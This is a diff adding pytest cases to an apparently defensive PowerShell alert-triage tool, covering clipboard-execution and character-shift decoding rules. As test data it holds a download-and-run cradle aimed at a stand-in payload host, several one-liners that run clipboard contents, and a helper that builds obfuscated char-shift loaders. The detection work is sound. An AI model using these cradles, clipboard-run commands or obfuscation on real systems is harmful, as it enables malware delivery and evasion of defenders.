@@ -6,13 +6,14 @@ directly. Triage-level tests run under @respx.mock to prove no HTTP happens.
 
 import base64
 import json
+import re
 from pathlib import Path
 
 import pytest
 import respx
 
 import behavior
-from behavior import analyze, behavior_verdict, decode_encoded_command
+from behavior import analyze, behavior_verdict, decode_char_shift, decode_encoded_command
 from models import Alert, BehaviorFinding
 from triage import triage
 
@@ -23,6 +24,20 @@ SYSTEM32 = r"C:\Windows\System32"
 POWERSHELL_EXE = rf"{SYSTEM32}\WindowsPowerShell\v1.0\powershell.exe"
 
 CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://payload.example/a.ps1')"
+CLIPBOARD_RUN = "Add-Type -AssemblyName System.Windows.Forms; iex ([Windows.Forms.Clipboard]::GetText())"
+
+
+def shift(script: str, amount: int) -> str:
+    """Move every character by `amount`, the way a char-shift obfuscator would."""
+    return "".join(chr(ord(ch) + amount) for ch in script)
+
+
+def shift_loader(script: str, amount: int = 3) -> str:
+    """A PowerShell one-liner that undoes a shift of `amount` and runs the result."""
+    return (
+        f"powershell.exe -sta -c \"$e='{shift(script, amount)}'; $d=''; "
+        f"foreach($c in $e.ToCharArray()){{ $d+=[char]([int]$c-{amount}) }}; $function:f=$d; f\""
+    )
 
 
 def encode(script: str, encoding: str = "utf-16-le") -> str:
@@ -79,6 +94,13 @@ POSITIVE_CASES = [
     ("discovery_commands", {"command_line": "nltest /dclist:lab.example"}),
     ("discovery_commands", {"command_line": "systeminfo"}),
     ("user_writable_execution", {"file_path": r"C:\Users\a\Downloads\setup.exe"}),
+    ("clipboard_execution", {"command_line": f'powershell -sta -c "{CLIPBOARD_RUN}"'}),
+    ("clipboard_execution", {"command_line": 'powershell -c "Get-Clipboard | Invoke-Expression"'}),
+    ("clipboard_execution", {"command_line": 'powershell -c "$function:x = Get-Clipboard; x"'}),
+    ("clipboard_execution", {"command_line": 'powershell -sta -c "iex ([System.Windows.Forms.Clipboard]::GetText())"'}),
+    ("char_shift_decoding", {"command_line": shift_loader("Get-Date")}),
+    ("char_shift_decoding", {"command_line": "powershell -c \"$d=-join ('Ijw.Ebuf' -split '' | % { if ($_) { [char]([int][char]$_ - 1) } }); iex $d\""}),
+    ("char_shift_decoding", {"command_line": "powershell -c \"$s='Fhw0Gdwh'; $o=''; for($i=0;$i -lt $s.Length;$i++){ $o+=[char]([int]$s[$i] - 3) }; & ([scriptblock]::Create($o))\""}),
     ("user_writable_execution", {"command_line": r'"C:\Users\a b\AppData\Roaming\x\run.exe" --silent'}),
 ]
 
@@ -117,6 +139,15 @@ FALSE_POSITIVE_CASES = [
     ("lsass_dump", {"command_line": "procdump -ma notepad.exe notepad.dmp"}),
     ("discovery_commands", {"command_line": r"net use Z: \\fs01\share"}),
     ("discovery_commands", {"command_line": "powershell Get-NetUser"}),
+    # Reading the clipboard is normal; only running it matches.
+    ("clipboard_execution", {"command_line": r'powershell -NoProfile -c "Get-Clipboard | Set-Content C:\Users\a\notes\paste.txt"'}),
+    ("clipboard_execution", {"command_line": 'powershell -sta -c "[Windows.Forms.Clipboard]::GetText() | Out-File clip.txt"'}),
+    ("clipboard_execution", {"command_line": r'powershell -File "C:\Program Files\LabOps\Scripts\Export-Clipboard.ps1" -Source Get-Clipboard'}),
+    ("clipboard_execution", {"command_line": 'powershell -c "Get-Date | Set-Clipboard; iex \'Write-Output done\'"'}),
+    # Character arithmetic without running the result, or without a loop.
+    ("char_shift_decoding", {"command_line": "powershell -c \"foreach($c in $s.ToCharArray()){ $u += [char]([int]$c - 32) }; Write-Output $u\""}),
+    ("char_shift_decoding", {"command_line": 'powershell -c "Write-Output ([char](65+3))"'}),
+    ("char_shift_decoding", {"command_line": "powershell -c \"$x=[char]([int]$c-3); iex $x\""}),
     ("user_writable_execution", {"file_path": r"C:\Program Files\LabOps\agent.exe", "command_line": r'"C:\Program Files\LabOps\agent.exe" --temp-dir C:\Users\a\AppData\Local\Temp'}),
 ]
 
@@ -295,3 +326,80 @@ def test_sample_alerts_use_only_reserved_network_values():
         data = json.loads(path.read_text())
         if data.get("domain"):
             assert data["domain"].endswith(".example"), path.name
+
+
+# --- Decoding character-shifted strings ---------------------------------------
+
+def test_char_shift_decoding():
+    assert decode_char_shift(shift_loader(CLIPBOARD_RUN)) == CLIPBOARD_RUN
+
+
+def test_char_shift_decoding_reads_the_raw_command_line():
+    # A shifted "[" is "^", which deobfuscate() strips. Decoding must not lose it.
+    command_line = shift_loader("[Windows.Forms.Clipboard]::GetText()")
+    assert "^" in command_line
+
+    assert decode_char_shift(command_line) == "[Windows.Forms.Clipboard]::GetText()"
+
+
+def test_char_shift_decoding_with_a_plus_shift():
+    command_line = f"powershell -c \"$e='{shift('Get-Process', -2)}'; $d=''; foreach($c in $e.ToCharArray()){{ $d+=[char]([int]$c + 2) }}; iex $d\""
+
+    assert decode_char_shift(command_line) == "Get-Process"
+
+
+@pytest.mark.parametrize("command_line", [
+    None,
+    "",
+    "powershell -c \"Write-Output 'no shift in this command line'\"",  # No [char](...).
+    "powershell -c \"$d=[char](65+3); Write-Output 'Fhw0Gdwh0Wklqj'\"",  # Constant, no variable.
+    "powershell -c \"foreach($c in $s){ $d+=[char]([int]$c-0) }; Write-Output 'Fhw0Gdwh0Wklqj'\"",  # Shift of 0.
+    "powershell -c \"foreach($c in $s){ $d+=[char]([int]$c-32) }; Write-Output 'HELLO WORLD!'\"",  # Case conversion.
+    "powershell -c \"foreach($c in $s){ $d+=[char]([int]$c-3) }; iex $d\"",  # No literal to decode.
+    "powershell -c \"foreach($c in $s){ $d+=[char]([int]$c-25) }; Write-Output 'abc def ghi'\"",  # Not text after the shift.
+])
+def test_char_shift_decoding_negative(command_line):
+    assert decode_char_shift(command_line) is None
+
+
+def test_char_shift_decoding_is_capped():
+    huge = "Write-Output hello; " * 2_000  # 40,000 characters
+    decoded = decode_char_shift(shift_loader(huge))
+
+    assert decoded.endswith("\n[truncated]")
+    assert len(decoded) <= behavior.MAX_DECODED_CHARS + len("\n[truncated]")
+
+
+def test_rules_run_on_char_shift_decoded_command():
+    findings = analyze(Alert(hostname="WS-TEST-01", command_line=shift_loader(CLIPBOARD_RUN)))
+
+    raw = {f.rule_id for f in findings if f.decoder is None}
+    shifted = {f.rule_id for f in findings if f.decoder == "char_shift"}
+    assert raw == {"char_shift_decoding"}
+    assert "clipboard_execution" in shifted
+    assert all(f.from_decoded for f in findings if f.decoder)
+
+
+@respx.mock
+def test_char_shift_findings_are_named_in_reasons():
+    result = triage(Alert(hostname="WS-TEST-01", command_line=shift_loader(CLIPBOARD_RUN)))
+
+    assert result.verdict == "malicious"
+    assert result.shift_decoded_command == CLIPBOARD_RUN
+    assert any(
+        r.startswith("behavior: PowerShell executes clipboard contents") and "in char-shift-decoded command" in r
+        for r in result.reasons
+    )
+    assert len(respx.calls) == 0
+
+
+def test_encoded_command_findings_name_their_decoder():
+    findings = analyze(Alert(hostname="WS-TEST-01", command_line=f"powershell -enc {encode(CRADLE)}"))
+
+    assert {f.decoder for f in findings if f.from_decoded} == {"encoded_command"}
+
+
+def test_sample_alert_urls_are_example_only():
+    for path in ALERTS_DIR.glob("*.json"):
+        for host in re.findall(r"https?://([^/\s'\"]+)", path.read_text()):
+            assert host.endswith(".example"), (path.name, host)
